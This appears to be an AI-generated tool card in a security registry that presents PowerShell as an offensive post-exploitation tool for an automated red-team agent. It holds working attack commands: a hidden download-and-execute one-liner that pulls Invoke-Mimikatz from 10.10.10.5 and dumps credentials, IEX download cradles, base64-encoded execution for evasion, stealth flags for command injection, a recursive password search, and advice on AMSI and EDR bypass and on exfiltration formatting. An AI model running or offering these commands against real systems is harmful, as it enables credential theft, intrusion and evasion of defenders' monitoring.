---
name: PowerShell
description: Cross-platform automation and scripting language for system
  administration, Active Directory enumeration, and post-exploitation tasks.
registry: security
tool_id: powershell
category: development
tags:
  - powershell
  - scripting
  - automation
  - windows
  - post-exploitation
  - enumeration
  - active-directory
mitre_techniques:
  - T1059.001
  - T1087.001
  - T1087.002
  - T1069.001
  - T1069.002
  - T1482
  - T1018
  - T1033
  - T1083
  - T1082
  - T1615
  - T1003
  - T1021.006
summary: Use PowerShell (pwsh) for post-exploitation enumeration, Active
  Directory reconnaissance, credential access, lateral movement preparation, and
  general Windows automation tasks. Invoke with `pwsh` for interactive shell or
  `pwsh -Command "<script>"` for single commands, `pwsh -File script.ps1` for
  scripts, or `pwsh -EncodedCommand <base64>` for obfuscation. PowerShell
  provides native access to .NET, COM objects, WMI, and Windows APIs. Expect
  object-oriented output by default (structured data) which can be piped through
  cmdlets like Where-Object, Select-Object, Format-List. Use `-NoProfile` to
  avoid execution policy issues and speed startup. Be aware that PowerShell
  activity generates extensive Windows Event Logs (Event ID 4104 for script
  block logging, 4103 for module logging) and may trigger EDR/AV. Leverage
  built-in cmdlets for AD enumeration (Get-ADUser, Get-ADComputer, Get-ADGroup),
  system recon (Get-Process, Get-Service, Get-NetTCPConnection), and file
  operations. Consider AMSI bypass techniques if working in hostile
  environments. Output can be formatted as JSON with ConvertTo-Json, CSV with
  Export-Csv, or plain text with Out-String.
generated_at: 2026-05-19T11:30:32.631Z
generated_by: anthropic
source_hash: f0bec618701772aba5df259b723375b3604f2e3c82de593961b08701587da059
---

# PowerShell

## Overview

PowerShell 7.6.0 (pwsh) is the cross-platform edition of PowerShell built on .NET Core. It provides a command-line shell and scripting language designed for system administration, automation, and configuration management. In red team operations, PowerShell is a primary tool for Windows enumeration, Active Directory reconnaissance, credential harvesting, privilege escalation, and lateral movement. It runs natively on Windows, Linux, and macOS, though most offensive capabilities target Windows environments. PowerShell's object-oriented pipeline, .NET integration, and deep Windows API access make it ideal for living-off-the-land techniques.

## When to use

Use PowerShell for: enumerating domain users, groups, computers, and trusts in Active Directory environments; querying local system information (processes, services, network connections, installed software); credential access operations (mimikatz integration, LSA secrets, SAM database queries); downloading and executing payloads in memory; interacting with Windows APIs and COM objects; automating repetitive post-exploitation tasks; bypassing application whitelisting through native signed binaries; performing file and registry operations; establishing persistence mechanisms; and preparing for lateral movement by gathering network topology and credential material. Prefer PowerShell over cmd.exe when you need structured output, complex logic, or access to Windows management frameworks.

## Authentication & setup

No authentication required for local execution. PowerShell runs under the security context of the invoking user. For remote operations, use PowerShell Remoting (Enter-PSSession, Invoke-Command) which requires WinRM service enabled on target and appropriate credentials (local admin or delegated permissions). Common authentication methods include: explicit credentials via -Credential parameter with Get-Credential or New-Object PSCredential; pass-the-hash via Invoke-Mimikatz or Rubeus; Kerberos ticket injection; or relying on existing session tokens. For domain enumeration, ensure network connectivity to domain controllers. To minimize detection, use `-NoProfile` flag to skip profile scripts and avoid execution policy checks. Set execution policy if needed with `Set-ExecutionPolicy Bypass -Scope Process` (affects current session only). Some environments enforce Constrained Language Mode; check with `$ExecutionContext.SessionState.LanguageMode`.

## Key commands / parameters

Invocation: `pwsh` (interactive shell), `pwsh -Command "Get-Process"` (execute single command), `pwsh -File script.ps1` (run script file), `pwsh -EncodedCommand <base64>` (execute base64-encoded commands for evasion), `pwsh -NoProfile -ExecutionPolicy Bypass` (bypass restrictions). Core enumeration cmdlets: `Get-ADUser -Filter *`, `Get-ADComputer -Filter *`, `Get-ADGroup -Filter *`, `Get-ADGroupMember`, `Get-ADDomain`, `Get-ADForest`, `Get-Process`, `Get-Service`, `Get-NetTCPConnection`, `Get-ChildItem`, `Get-Content`, `Get-WmiObject Win32_ComputerSystem`, `Get-LocalUser`, `Get-LocalGroup`, `Get-LocalGroupMember`, `whoami /all` (via cmd), `[System.Security.Principal.WindowsIdentity]::GetCurrent()`. Network operations: `Test-Connection`, `Resolve-DnsName`, `Invoke-WebRequest`, `Invoke-RestMethod`. Download cradles: `IEX (New-Object Net.WebClient).DownloadString('http://url')`, `IEX (IWR -Uri http://url -UseBasicParsing)`. Output manipulation: `Select-Object`, `Where-Object`, `Format-List`, `Format-Table`, `ConvertTo-Json`, `Export-Csv`, `Out-File`, `Out-String`. Use `-NoP -NonI -W Hidden -Exec Bypass` flags for stealthy execution in command injection scenarios.

## Example workflows

**Active Directory enumeration**: `pwsh -NoProfile -Command "Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Description,LastLogonDate | ConvertTo-Json"` to extract all domain users with properties. **Credential search**: `pwsh -Command "Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List"` to find files containing passwords. **Process enumeration**: `pwsh -Command "Get-Process | Where-Object {$_.ProcessName -match 'lsass|powershell|cmd'} | Format-List *"` to identify security-relevant processes. **Download and execute**: `pwsh -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"`. **Network recon**: `pwsh -Command "1..254 | ForEach-Object {Test-Connection -ComputerName 192.168.1.$_ -Count 1 -Quiet}"` for host discovery. **Base64 payload delivery**: Encode command with `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process'))` then execute with `pwsh -EncodedCommand <base64>`.

## Output format

PowerShell outputs .NET objects by default, not plain text. This enables rich pipeline operations where objects pass between cmdlets with full properties intact. Interactive shell displays formatted views (tables or lists) automatically. When capturing output programmatically, use `ConvertTo-Json` for structured JSON, `Export-Csv` for tabular data, `Out-String` to convert objects to text, or `Format-List *` to see all object properties. Errors appear on stderr and can be suppressed with `-ErrorAction SilentlyContinue` or captured with try/catch blocks. Script block output returns to stdout. Remote command execution via Invoke-Command serializes objects as XML (CliXml). For exfiltration, JSON format is most portable across tools. Be aware that default truncation occurs in table views; use `Format-Table -AutoSize` or `Format-List` to see complete data.

## Common pitfalls

**Logging and detection**: PowerShell 5.0+ includes script block logging (Event ID 4104), module logging (4103), and transcription which record all commands. PowerShell 7.x also supports these on Windows. Assume all activity is logged in mature environments. **AMSI**: Anti-Malware Scan Interface inspects PowerShell commands and scripts in real-time; known malicious patterns (mimikatz, invoke-expression with URLs) trigger alerts. Obfuscation or AMSI bypass required in hardened targets. **Constrained Language Mode**: Restricts PowerShell functionality, blocking direct .NET access, COM, and Add-Type. Check with `$ExecutionContext.SessionState.LanguageMode`. **Execution policy**: Not a security boundary but may block scripts; bypass with `-ExecutionPolicy Bypass` or `-EncodedCommand`. **Module availability**: Active Directory module (Get-ADUser, etc.) requires RSAT tools or domain controller access; may not be present on workstations. Fall back to .NET DirectorySearcher or LDAP queries. **Encoding issues**: When passing commands through shells or web requests, Unicode encoding mismatches break payloads; use `-EncodedCommand` for reliability. **EDR hooks**: Modern EDR products hook PowerShell APIs; suspicious patterns (process injection, credential access) generate high-fidelity alerts even without traditional AV signatures. **Exit codes**: PowerShell exits 0 even when errors occur unless script explicitly exits with non-zero code; check `$?` or `$LASTEXITCODE`.

## References

No external research URLs provided.
